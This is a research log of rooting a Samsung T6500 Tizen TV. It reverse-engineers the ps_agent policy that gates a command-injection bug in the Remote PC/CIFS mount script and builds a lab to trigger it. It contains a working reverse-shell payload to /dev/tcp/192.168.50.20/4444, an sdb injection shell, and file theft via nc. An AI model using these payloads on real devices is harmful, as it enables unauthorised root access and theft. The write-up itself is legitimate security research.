---
type: investigation
tags: [samsung, tizen, tv, root, remotepc, cifs, smack, ghidra, reverse-engineering]
created: 2026-10-23
last_verified: 2026-10-25
status: current
---

# Samsung TV root: the Remote PC / CIFS route, and the binary policy that gates it

> **Paths relocated (2026-10-25):** `~/kants2-exploit` → `~/archive/samsung-tv-t6500-2026-10/exploit-src/kants2-exploit`; `~/tvlab` → `~/archive/samsung-tv-t6500-2026-10/infra/tvlab`; `~/tvtest` → `~/archive/samsung-tv-t6500-2026-10/infra/tvtest`. The `~/ghidra_12.1.4_PUBLIC` referenced below was a duplicate install, now at `~/archive/samsung-tv-t6500-2026-10/duplicates/ghidra_12.1.4_PUBLIC` — the live Ghidra install to actually use is `~/tools/ghidra_12.1.4_PUBLIC` (`GHIDRA_INSTALL_DIR` in `~/tools/rea-env.sh`).

Device: Samsung **UA43T6500AKXXD** (2020 T6500, `20_KANTS2_FHD`, Tizen 5.5, armv7l,
kernel `4.1.10` build `T-KTS2UABC-REL-202607281700`), 192.168.50.31.
Host: fedora, 192.168.50.20.

Follow-up to `samsung-tv-root-exploit-compatibility-probe.md`. That probe was a
negative result for chris-ritsen/samsung-tv-root. This is the route that
actually applies to this firmware, and the reverse-engineering that shows
exactly why it is the only route.

## Where the earlier routes died

- **Kernel physmap (`ntksys`)** — califio/MADBugs' chain for the same
  `20_KANTS2_FHD` family no longer works here. `ioctl` still round-trips
  (`SET_MEM_INFO` echoes `start=0x02000000 size=0x1000`, `GET_BUFF_ADDR` ->
  `phys=0x93040000`), but `mmap()` on `/dev/ntksys`, `/dev/ntkmem`,
  `/dev/ntkxdma` and `/dev/mali0` returns `MAP_FAILED` at every offset, size
  and protection. `/dev/ntkhdma` and `/dev/ntkgpu` map but ignore the offset.
  `/dev/mem` and `/dev/kmem` are absent. This matches tiz0wn's description of
  `check_mmap_area_is_valid` hardening.
- **Unsigned code execution** — UEP refuses unsigned ELF on every writable
  filesystem (`file /tmp/h is not signed. Sign it.(fsname:tmpf)`), including
  when loaded through `/lib/ld-linux.so.3`.
  Managed code is the way in: a `tz pack`-signed TPK installs and runs
  (`0 appinstall tpk`, `0 execute`), giving uid 5001 / gid 100 with SMACK
  label `User::Pkg::<package>`, and .NET can reach libc via
  `NativeLibrary.Load` + `Marshal.GetDelegateForFunctionPointer`.

Two footholds were kept:

| foothold | identity | how |
|---|---|---|
| sdb injection shell (SVE-2025-50109, `0 appinstall tpk <inj>`) | uid 901 `sdk`, SMACK `System` | one-shot commands, intermittently returns empty |
| signed TPK app `samudntest01.DnTest` | uid 5001, SMACK `User::Pkg::samudntest01` | outbound TCP shell to 192.168.50.20:9999 (`tvshell.py` + `shellsrv.cs`) |

## The Remote PC / CIFS root bug

`/usr/apps/privileged-service/bin/mount.smb.sh` ends with

```sh
/bin/bash -c "$UTIL $UTIL_OPT"
```

and `UTIL_OPT` is assembled from the credential file that Remote PC writes
(`username=`, `password=`, `smbpath=`). The contents are not shell-escaped, so a
command substitution in either field is evaluated **as root** when the TV mounts
a share. Same bug class as tiz0wn's `research/remotepc-cifs-root`.

The guard is `com.safe.ps_agent` on the system bus, `CallCommand(s,s,i,i)`. Every
call is refused unless the caller matches a credential compiled into the
daemon — which is what this session reverse-engineered.

## Reversing ps_agent with rea + Ghidra

Toolchain note: **rea needs the Ghidra 12.1.x line** (12.2 is rejected outright)
plus a full JDK, not a JRE. On Fedora 43:

```bash
sudo dnf install -y java-25-openjdk-devel
curl -LO https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_12.1.4_build/ghidra_12.1.4_PUBLIC_20260921.zip
unzip -q ghidra_12.1.4_PUBLIC_20260921.zip
export GHIDRA_INSTALL_DIR=$HOME/ghidra_12.1.4_PUBLIC JAVA_HOME=/usr/lib/jvm/java-25-openjdk
export PATH=$JAVA_HOME/bin:$PATH

rea analyze   /tmp/ps_agent --format json
rea search    /tmp/ps_agent "check credential" --format json
rea xrefs     /tmp/ps_agent <string-address> --format json
rea decompile /tmp/ps_agent <function-address> --format json   # pseudocode in .normalized_result
```

Function addresses came from the dynamic symbol table
(`arm-linux-gnu-nm -D -C --defined-only /tmp/ps_agent`) because the binary is
stripped of static symbols but keeps exported C++ symbols:

| symbol | addr |
|---|---|
| `PS_Executor::Execute` | logged at 0x44xxx |
| `PS_CredentialManager::MatchAuth` | 0x2d2f8 |
| `PS_AuthInfo::Match` | 0x2d198 |
| `PS_AuthInfo::PS_AuthInfo` (regex compile) | 0x2d700 |
| `PS_Rule::Match` | 0x3383c |
| `PS_CredentialManager::PS_CredentialManager` | 0x2fe1c |
| `PS_CredentialManager::GetCredentials` | 0xef6c |

### What Execute does

`PS_Executor::Execute` reads the caller pid (`Auth::GetCallerPid`), then
`Auth::GetPath` (`/proc/<pid>/exe`) and `Auth::GetSmackLabel`
(`/proc/<pid>/attr/current`), builds a `PS_AuthInfo(smack, path)`, and asks
`PS_CredentialManager::MatchAuth` for the credentials whose auth info matches.
On failure it logs

```
check credential for pid:%d agent: %s path: %s smack: %s available credential: %d
```

which is the line seen for every rejected call (`path: /usr/bin/dbus-send
smack: System available credential: 0`).

### The comparison is anchored, not substring

`PS_AuthInfo::Match` compiles both stored regexes (`boost::basic_regex::do_assign`)
and calls the wrapper at `0x3ca54` twice — once for label, once for path. The
wrapper is an inlined `boost::regex_match`: after `perl_matcher::match_prefix`
it returns true only when the match **starts at the beginning and ends at the
end of the input**:

```c
iVar22 = perl_matcher::match_prefix(&local_a8);
if (iVar22 != 0) {
    pvVar12 = *local_a8; pvVar8 = local_a8[1];
    ...
    if (ppvVar16[1] == local_98) {          /* match end == input end   */
        ...
        bVar20 = *ppvVar16 == local_9c;     /* match start == input start */
    }
}
```

So the caller must match **exactly** — no substring, no prefix, no suffix trick.
(The same decompile pass also proves `MatchAuth` has no fallback path: it walks
the credential vector and calls `PS_AuthInfo::Match` for each entry.)

### The compiled credential for ps_mount_cifs

`.rodata` (vaddr == file offset, 0x353a8..0x3e494) holds the table, and the key
strings are `ps_insmod` (0x358dc), `ps_mount` (0x38d84), `ps_mount_cifs`
(0x38f54), `ps_umount` (0x39af0), `ps_umount_cifs` (0x39b5c), `ps_mknod`
(0x39bbc), `ps_rmmod` (0x39bf4), `ps_systemctl` (0x39c54). The SMB credential
appears in the block ending just before the `ps_mount_cifs` key:

```
0x38dab  label regex  User\:\:Pkg\:\:org\.tizen\.remotepc
0x38dab  path  regex  \/usr\/apps\/org\.tizen\.remotepc\/bin\/remotepc\_uilauncher
0x38df4  arg   regex  ^\-o\s+credentials\=\/tmp\/[A-Za-z0-9_.:-]+\,vers\=[A-Za-z0-9_.:-]+\s+\/\/192\.168\.0\.13\/\[\:SMBPATH\:\]\s+...
0x38e9c  arg   regex  ^\-o\s+ro\,nosuid\,noexec\,nodev\,credentials\=\/tmp\/[A-Za-z0-9_.:-]+\,vers\=2\.1\s+\/\/[A-Za-z0-9_.:-]+\/\[\:SMBPATH\:\]\s+\/opt\/usr\/home\/owner\/content\/smb\/\[\:SMBPATH\:\]$
0x359f0  /usr/bin/launchpad-loader  -> belongs to the Netflix rule, NOT Remote PC
```

Points that matter:

- The host in the mount argument is a **character class**, `[A-Za-z0-9_.:-]+`, so
  the target PC can be any LAN address. The literal `192.168.0.13` rule is a
  different, narrower entry.
- `vers=2.1` is mandatory, and the credential file must be `/tmp/<name>`.
- `launchpad-loader` is often quoted as a second allowed caller; it is not —
  it is paired with `User::Pkg::org.tizen.netflix-app` in the Netflix rule.
- The policy is compiled in. A grep for `ps_mount_cifs` across `/usr/apps`,
  `/opt/usr`, `/usr/share` and `/etc` returns only the `ps_agent` binary itself;
  there is no XML/config to edit.

Attribute that block to `ps_mount` rather than `ps_mount_cifs` and it changes
nothing for the attacker: both keys are only reachable from the same process, and
this is the only credential in the whole table that carries an SMB
`credentials=` argument with a caller-supplied host. Exact key-level attribution
could not be settled further — `PS_CredentialManager::GetCredentials` (0xef6c)
fails to decompile (`rea`: `Analysis failed`) and `.data.rel.ro` contains no
pointers to these strings, so the table is built at runtime by that function and
the grouping above rests on `.rodata` layout adjacency.

### The rest of the table (why no other agent is reachable)

Every other credential pair in `.rodata` is equally app-specific and equally
unreachable from uid 901 (`System`) or from our own TPK app
(`User::Pkg::samudntest01`):

| label | path | serves |
|---|---|---|
| `User::Pkg::org.tizen.ep-hotel-hms` | `/opt/usr/apps/org.tizen.ep-hotel-hms/bin/` | loading usbserial/cp210x/cdc-acm/ftdi_sio modules |
| `System::Privileged` | `/usr/apps/com.samsung.tv.nfc-daemon/bin/...`, `/usr/bin/gatorDir/tztv-tagpro-*` | NFC + tagpro kernel modules |
| `User::App::org.tizen.netflix-app` / `User::Pkg::org.tizen.netflix-app` | `/usr/apps/org.tizen.netflix-app/bin/netflix-app`, `/usr/bin/launchpad-loader`, `/usr/bin/node`, `/usr/bin/wrt-service`, `.../wrt-service-standalone`, `/usr/bin/wrt` | loop-mounts of `empNetflix.img`, `*.tmg`, `wsa` images |
| (remotepc) | `/usr/apps/org.tizen.remotepc/bin/remotepc_uilauncher` | the SMB/CIFS mount |

The remaining `mount`-shaped rules (`^/tmp/[A-Za-z0-9_.:-]+$`,
`^-l /tmp/...$`, `^/opt/usr/apps/<pkg>/res/wgt$`) belong to those same app
credentials, not to a generic agent, so knowing them does not add a route.

Consequence: `dbus-send`, `busctl`, the sdk shell (SMACK `System`) and our own
TPK app can never satisfy this. The agent name, the label and the exact
executable path only line up inside the genuine Remote PC UI process.

## Who actually issues the mount

From `remotepc_rdp`, `remotepc_uilauncher` and `remotepc_manager`:

1. `remotepc_rdp` sends an EFL-IPC bundle `OPERATION=SAMBA_MOUNT` to the
   launcher (`efCreateMessageTemplate("org.tizen.remotepc.client","org.tizen.remotepc.ui")`).
2. The launcher (`remotepc_uilauncher`, the one process whose exe path and SMACK
   label both match the credential) handles it in its RDP/VNC session threads:
   reads the host and username from the profile DB, reads the password from
   SecureStorage key `RemotePCPassword`, then `Samba::Connect`.
3. `Samba::Connect` checks the host is in the local subnet, `mkdir`s
   `/opt/usr/home/owner/content/smb`, calls `smb2_scan_init(host,user,pass)`,
   and for every share not ending in `$` writes a `tmpnam()` credential file
   (`username=`, `password=`, `smbpath=`) and calls `PS_Mount_Cifs` with
   `-o ro,nosuid,noexec,nodev,credentials=<tmp>,vers=2.1 //<host>/<share> /opt/usr/home/owner/content/smb/<share>`.
4. That call reaches `ps_agent`, matches the one credential, and
   `mount.smb.sh` evaluates the password through `/bin/bash -c`.
5. The credential file is removed right after the mount attempt.

So the payload is typed **once**, as the Remote PC profile password — the Shared
Folder step reuses the stored `RemotePCPassword`. `remotepc_manager` cannot
produce a mount at all: its `messageHandler` only echoes
`SAMBA_NOTALLOWED`/`SAMBA_SUBNETERR` based on a caller-supplied `RESPONSE`
string and `execv`s the RDP/VNC clients.

## Lab built to make the UI flow succeed

The TV only writes the credential file after an SMB enumeration with those exact
credentials, and the RDP login has to succeed first, so both services must accept
a payload-shaped password. On fedora, two rootful podman containers with host
networking (`/home/moo/tvlab`, `setup.sh` / `teardown.sh` / `verify_all.sh`):

- `tvlab-xrdp` — xrdp 0.9.21 + xrdp-sesman + Xvnc, session = xterm, port 3389.
- `tvlab-samba` — samba 4.17, SMB2+, standalone, `[share] -> /srv/share`,
  `valid users = tvuser`, port 445.
- Password file `/home/moo/tvlab/pw` is `root:root 0600`, mounted read-only at
  `/run/tvlab-pw` and fed to `chpasswd`/`smbpasswd -s` on stdin, so it never
  appears in an argument list.

Payload used as the literal password (45 chars):

```text
$(bash -i >&/dev/tcp/192.168.50.20/4444 0>&1)
```

Verified (captured in `tvlab/VERIFY.txt`):

- `smbclient -L //192.168.50.20 -U 'tvuser%<password>'` -> share listed, exit 0;
  authenticated listing of `//192.168.50.20/share` -> exit 0;
  control with a wrong password -> `NT_STATUS_LOGON_FAILURE`, exit 1.
- `pamtester` against `/etc/pam.d/xrdp-sesman` -> `successfully authenticated`
  exit 0; wrong password -> `Authentication failure` exit 1.
- Real RDP login -> server side
  `++ created session (access granted): username tvuser` with Xvnc on `:10`.
- Raw X.224 probe -> TPKT + Connection Confirm (`0xD0`).
- Trap on `:4444` armed during both logins -> no connection (the payload string is
  not evaluated by the services), and a deliberate redirection does trigger it,
  so the trap demonstrably works.

Firewall: the TV reaches every port on fedora because `trusted` has the source
`192.168.50.31` (`firewall-cmd --zone=trusted --add-source=192.168.50.31`).
Runtime only — it does not survive `firewall-cmd --reload` or a reboot.

## Gotchas found along the way

- **No `timeout` on the TV.** Port probes written as
  `timeout 3 bash -c "echo >/dev/tcp/..."` return "blocked" for every port simply
  because the binary does not exist. Check `command -v timeout` first.
- **The TPK app's sandbox has almost no filesystem.** Inside the app,
  `/usr/bin` contains only `csapi-tv-tizenfx`, `dotnet-launcher`, `ls`, `ps`,
  `sh`, `zone-init` — no `bash`, `cat`, `head`, `sed`, `dlogutil`. The `sh`
  there is not bash, so `/dev/tcp` redirection fails and app-side network
  tests are meaningless. The app's own .NET sockets work fine.
- **`sdb shell` is unreliable** (`intershell_support:disabled`): commands
  frequently return empty while `sdb capability` and
  `sdb shell "0 execute <appid>"` keep working.
- `sdb pull` is denied for `/usr/sbin/sdbd-tarlauncher` and `/tmp` paths
  (`You cannot pull files from this path`); exfiltration went through
  `/dev/tcp` + `gzip -9c | base64` to `nc` listeners instead.
- The decompiler wrapper returns pseudocode as a string in
  `.normalized_result`, not in a `pseudocode`/`code` field — parse accordingly.

## Status / next step

Everything up to the UI action is prepared and verified: the target knows the
policy, the lab is up, the listener is armed (`rootlisten.py`, port 4444,
proof written to `kants2-exploit/root_proof.txt`).

The remaining step is human: on the TV, `Smart Hub -> Source -> Remote Access ->
Remote PC -> User -> Add` with host `192.168.50.20`, user `tvuser`, password
`$(bash -i >&/dev/tcp/192.168.50.20/4444 0>&1)`, then the shared-folder icon in
the session's top bar. That click is what fires `mount.smb.sh` as root.

## Files

- `~/tvlab/` — lab (`Containerfile.xrdp`, `xrdp.ini`, `entry-xrdp.sh`,
  `Containerfile.samba`, `smb.conf`, `entry-samba.sh`, `setup.sh`,
  `teardown.sh`, `verify_all.sh`, `README.md`, `VERIFY.txt`, `pw`)
- `~/kants2-exploit/` — `tvsh.py` (sdb injection shell), `tvshell.py` +
  `dntest/Program.cs` (`shellsrv.cs`, TCP shell in the signed TPK),
  `rootlisten.py` (root callback catcher), `root_proof.txt`
- `~/tvtest/deploy.sh <version>` — build, zip, `tz pack`, push, `appinstall`
- exfiltrated binaries for RE: `/tmp/ps_agent`, `/tmp/remotepc_uilauncher`,
  `/tmp/remotepc_manager`, `/tmp/remotepc_rdp`
- decompiler: `~/ghidra_12.1.4_PUBLIC` + `rea`

## References

- [sebastianspicker/tiz0wn](https://github.com/sebastianspicker/tiz0wn) — `research/remotepc-cifs-root/` (README, DISCLOSURE, LIVE-CHECKPOINT) and `docs/firmware-analysis.md`: the Remote PC/Shared Folder -> `mount.smb.sh` -> root finding
- [morluto/rea](https://github.com/morluto/rea) — Ghidra-backed analysis CLI used for the decompilation
- [califio/MADBugs](https://github.com/califio/publications) — the `ntksys` physmap chain, dead on this firmware
